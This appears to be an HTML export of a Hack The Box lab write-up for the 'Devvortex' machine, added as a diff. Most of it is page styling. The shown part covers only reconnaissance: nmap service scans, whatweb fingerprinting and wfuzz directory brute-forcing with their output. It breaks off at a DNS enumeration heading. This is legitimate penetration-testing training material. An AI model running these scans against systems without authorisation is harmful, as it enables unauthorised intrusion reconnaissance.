@@ -1,0 +1,1155 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Devvortex - 10.10.11.242</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+</style>
+<body>
+	
+<article id="ceb77ba4-f14d-4e73-a572-f881bd1fff86" class="page sans"><header><h1 class="page-title"><strong>Devvortex - 10.10.11.242</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="23684812-a8f7-4519-bf19-08551b391b7f" class="">Information Gathering &amp; Enumeration</h1><p id="12b53d96-fc65-4bc5-bad4-1df3f695dacd" class="">We start with NMAP, dns enumeration and dir enumeration and opening that IP on browser</p><p id="df178963-3256-42b4-bcab-d1043b0fe554" class="">
+</p><h2 id="bb2adfc4-1734-42d6-9e4a-3cd31563747e" class="">Browser</h2><figure id="e2958162-f250-4446-b04f-a8b485d1dcd4" class="image"><a href="../img/devvortex/Untitled.png"><img style="width:1920px" src="../img/devvortex/Untitled.png"/></a></figure><p id="4770e6a4-4261-4834-8388-eb5be1265c73" class="">Adding devvortex.htb to /etc/hosts</p><figure id="02b5b900-6404-43cd-972b-6851ef830766" class="image"><a href="../img/devvortex/Untitled 1.png"><img style="width:945px" src="../img/devvortex/Untitled 1.png"/></a></figure><p id="2e3d3a2c-97a1-41d3-9fa2-12713baefcc8" class="">
+</p><h2 id="bc5d49a6-633c-4481-b3b9-f4421c702cd8" class="">Nmap</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="46aae2dd-421d-4dfa-939b-befefe795e86" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nmap -sVC -T5 -n 10.10.11.242     
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-02 22:28 -05
+Warning: 10.10.11.242 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.242
+Host is up (0.093s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp   open     http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+425/tcp  filtered icad-el
+5800/tcp filtered vnc-http
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
+                                                              </code></pre><p id="2e3322f0-6d47-4ea4-ad4c-95dc1b531935" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a1e3bad6-7bd3-4566-a5a9-e566daaf546b" class="code"><code class="language-JavaScript">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ nmap -sVC -T5 -n devvortex.htb
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-02 22:34 -05
+Warning: 10.10.11.242 giving up on port because retransmission cap hit (2).
+Nmap scan report for devvortex.htb (10.10.11.242)
+Host is up (0.094s latency).
+Not shown: 912 closed tcp ports (conn-refused), 86 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: DevVortex
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.14 seconds
+</code></pre><p id="30e238d8-a463-4eb2-9be4-55751edc6584" class="">
+</p><p id="a6b3fc1e-70f7-4d7e-800c-47f53c6e1b82" class="">
+</p><h2 id="1e5716f2-1666-4922-83ae-dce846c1d7d5" class="">Web Information</h2><figure id="1dcc4871-cd7c-4201-b8d9-53cc1c6794ea" class="image"><a href="../img/devvortex/Untitled.png"><img style="width:1920px" src="../img/devvortex/Untitled.png"/></a></figure><p id="649e4c47-37a9-4c59-816f-7fe3f5699d3a" class="">
+</p><figure id="48369b5a-35ef-4c44-9eea-52a52c325a8d" class="image"><a href="../img/devvortex/Untitled 3.png"><img style="width:1920px" src="../img/devvortex/Untitled 3.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="628127c2-4d92-4b5b-bfd2-c232e0e40b0a" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ whatweb &quot;http://devvortex.htb/&quot; -a 3                                                                
+http://devvortex.htb/ [200 OK] Bootstrap[4.3.1], Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]</code></pre><p id="a2060b6c-1b5e-40e6-b9d8-46e11c52126c" class="">
+</p><h2 id="1952d2fe-b4b9-4ae3-80f4-cb490246349f" class="">Dir Enum</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6abf298a-3455-483a-8282-1773e722a97e" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://devvortex.htb/FUZZ -t 50 --hh 162
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://devvortex.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000002:   301        7 L      12 W       178 Ch      &quot;images&quot;                                            
+000000009:   301        7 L      12 W       178 Ch      &quot;js&quot;                                                
+000000015:   301        7 L      12 W       178 Ch      &quot;css&quot;                                               
+000004255:   200        583 L    1274 W     18048 Ch    &quot;http://devvortex.htb/&quot;                             
+
+Total time: 60.16928
+Processed Requests: 29950
+Filtered Requests: 29946
+Requests/sec.: 497.7622
+</code></pre><p id="d92842a5-8b1f-4a9c-8364-3bdf8173d51d" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c2755c09-39ff-469a-829d-7e7114bfb438" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devvortex.htb/FUZZ -t 50 --hh 162 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://devvortex.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000016:   301        7 L      12 W       178 Ch      &quot;images&quot;                                                                                          
+000000550:   301        7 L      12 W       178 Ch      &quot;css&quot;                                               
+000000953:   301        7 L      12 W       178 Ch      &quot;js&quot;                                                
+000045240:   200        583 L    1274 W     18048 Ch    &quot;http://devvortex.htb/&quot;     </code></pre><p id="30a73f7c-2b1c-4eea-a796-f9cdd9d8ab3d" class="">
+</p><p id="11e67c4b-307e-4f34-8b9a-4f172049da95" class="">
+</p><h2 id="cf6358f3-d19e-4b15-9a3b-3b3bdd6b2353" class="">DNS Enum</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="93932db0-c2f7-441c-b293-b7354fe9096c" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
